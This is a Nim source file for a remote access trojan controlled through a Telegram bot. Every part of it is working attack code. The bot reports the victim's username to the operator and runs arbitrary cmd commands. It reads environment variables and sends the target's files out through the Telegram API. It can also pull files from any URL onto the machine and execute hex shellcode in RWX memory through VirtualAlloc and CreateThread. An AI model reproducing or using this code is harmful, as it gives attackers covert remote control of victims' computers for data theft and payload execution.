import winim/lean, telebot, asyncdispatch, os, strutils, httpclient, osproc,options, json
from strformat import fmt

const API_KEY = "API_KEY"
const chat_id = 0000 #YOUR_CHAT_ID_WITH_THE_BOT

const help_message = """
/help shows this help message
/env <var> get enviroment variables
/exec <command> execute command line arguments
/download <filename> downloads file from target's pc
/downloadUrl <url> downloads a file from url to target's pc
/shellcode <hex shellcode> executes shellcode in memeory
"""


proc execShellCode(shellcode: string) =
    var buf = shellcode
    var lpBufSize: SIZE_T = (SIZE_T)len(buf)
    var lpBuf = VirtualAlloc(NULL, lpBufSize, 0x3000, 0x00000040)
    RtlMoveMemory(lpBuf, &buf, len(buf))
    var lpStart: LPTHREADSTARTROUTINE = cast[proc(lpThreadParameter: LPVOID): DWORD{.stdcall.}](lpBuf)
    var hThread = CreateThread(NULL, 0, lpStart, lpBuf, 0, NULL)
    WaitForSingleObject(hThread, -1)

proc shellCode(b: Telebot, e: Command): Future[bool] {.async.} =
    let shellcode = parseHexStr(e.command.split(" ", 1)[1])
    execShellCode(shellcode)
    discard await b.sendMessage(e.message.chat.id, "[*]  (" & $shellcode.len() & " bytes) executed in memory.")
    
proc downloadUrl(b:TeleBot, e: Command): Future[bool] {.async.} =
    let url = e.command.split(" ", 1)[1]
    let output = "log.txt"
    var client = newAsyncHttpClient()
    await client.downloadFile(url, output)

proc download(b: Telebot, e: Command): Future[bool] {.async.} =
    let file_name = e.command.split(" ", 1)[1]
    let f = "file://" & file_name
    discard await b.sendDocument(e.message.chat.id, f, caption = file_name)


proc uploadHandler(b: TeleBot, e: Update): Future[bool] {.async.} =
  let
    url_getfile = fmt"https://api.telegram.org/bot{API_KEY}/getFile?file_id="
    api_file = fmt"https://api.telegram.org/file/bot{API_KEY}/"

  var response = e.message.get
  if response.document.isSome:
    let
      document = response.document.get
      file_name = document.file_name.get
      responz = await newAsyncHttpClient().get(url_getfile) # file_id > file_path
      responz_body = await responz.body
      file_path = parseJson(responz_body)["result"]["file_path"].getStr()
      responx = await newAsyncHttpClient().get(api_file & file_path)  # file_path > file
      file_content = await responx.body
    writeFile(file_name, file_content)
    discard await b.sendMessage(response.chat.id, "file uploaded successfully")

proc help(b: Telebot, e: Command): Future[bool] {.async.} =
    discard await b.sendMessage(e.message.chat.id, help_message)

proc execCMD(b: Telebot, e: Command): Future[bool] {.async.} =
    try:
        let com = e.command.split(" ", 1)[1]
        let (res, errC) = execCmdEx("cmd /c " & com, options = {poDemon, poEvalCommand})
    
        if len(res) != 0:
            discard await b.sendMessage(e.message.chat.id, res)
    except:
        let
          er = getCurrentException()
          msg = getCurrentExceptionMsg()
          mes = "Got exception " & repr(er) & " with message " & msg
        discard await b.sendMessage(e.message.chat.id, mes)


proc get_env(b: Telebot, e: Command): Future[bool] {.async.} =
    if e.message.text.isSome:
        let res = getEnv(e.command.split()[1])
        discard await b.sendMessage(e.message.chat.id, res)


proc main =
  try: 
      let bot = newTeleBot(API_KEY)
      discard bot.sendMessage(chat_id, getEnv("username") & " is on")
      bot.onCommand("env", get_env)
      bot.onCommand("exec", execCMD)
      bot.onCommand("download", download)
      bot.onCommand("help", help)
      bot.onCommand("downloadUrl", downloadUrl)
      bot.onCommand("shellcode", shellCode)
      bot.onUpdate(uploadHandler)
      bot.poll(timeout=300)
  except:
      discard
main()
